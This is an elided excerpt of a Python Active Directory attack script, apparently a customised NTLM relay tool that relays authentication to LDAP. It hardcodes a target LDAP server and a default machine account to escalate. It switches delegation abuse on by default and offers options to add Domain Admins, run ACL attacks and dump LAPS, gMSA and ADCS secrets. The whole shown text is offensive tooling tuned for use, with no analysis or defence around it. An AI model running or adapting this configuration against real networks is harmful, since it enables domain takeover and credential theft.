...
def start_servers(options, threads):
    for server in RELAY_SERVERS:
        ...
        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.user_delegate_access)
...
if __name__ == '__main__':
    ...
    #need notice
    #need change
    #parser.add_argument('-t',"--target",default='ldap://10.68.249.8', action='store', metavar = 'TARGET')
    parser.add_argument('-t',"--target",default='ldap://192.168.160.128', action='store', metavar = 'TARGET')
    ...
    serversoptions.add_argument('--no-smb-server', action='store_false', help='Disables the SMB server')
    serversoptions.add_argument('--no-http-server', action='store_true', help='Disables the HTTP server')
    serversoptions.add_argument('--no-wcf-server', action='store_false', help='Disables the WCF server')
    serversoptions.add_argument('--no-raw-server', action='store_false', help='Disables the RAW server')
    ...
    ldapoptions.add_argument('--no-dump', action='store_true', required=False, help='Do not attempt to dump LDAP information')
    ldapoptions.add_argument('--no-da', action='store_true', required=False, help='Do not attempt to add a Domain Admin')
    ldapoptions.add_argument('--no-acl', action='store_true', required=False, help='Disable ACL attacks')
    ldapoptions.add_argument('--no-validate-privs', action='store_true', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
    
    #need notice 
    #need change
    ldapoptions.add_argument('--escalate-user', default='zhangleic$', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
    ...
    #need notice 
    ldapoptions.add_argument('--delegate-access', action='store_false', required=False, help='Delegate access on relayed computer account to the specified account')
    ...
    ldapoptions.add_argument('--user-delegate-access', action='store_false', required=False, help='Delegate access on relayed user account to the specified account')
